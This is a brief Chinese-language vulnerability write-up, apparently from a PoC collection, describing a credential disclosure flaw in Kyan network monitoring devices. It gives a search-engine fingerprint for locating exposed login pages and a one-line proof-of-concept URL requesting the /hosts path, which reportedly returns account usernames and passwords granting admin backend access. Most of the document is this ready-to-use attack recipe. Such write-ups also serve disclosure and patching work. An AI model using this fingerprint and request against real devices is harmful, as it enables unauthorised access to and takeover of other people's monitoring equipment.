# Kyan 网络监控设备 hosts 账号密码泄露漏洞

## 漏洞描述

Kyan 网络监控设备 存在账号密码泄露漏洞，攻击者通过漏洞可以获得账号密码和后台权限

## 漏洞影响

```
Kyan
```

## 网络测绘

```
title="platform - Login"
```

## 漏洞复现

登录页面如下

![](images/202202140926162.png)

POC

```plain
http://xxx.xxx.xxx.xxx/hosts
```

![](images/202202140927595.png)

成功获得账号密码



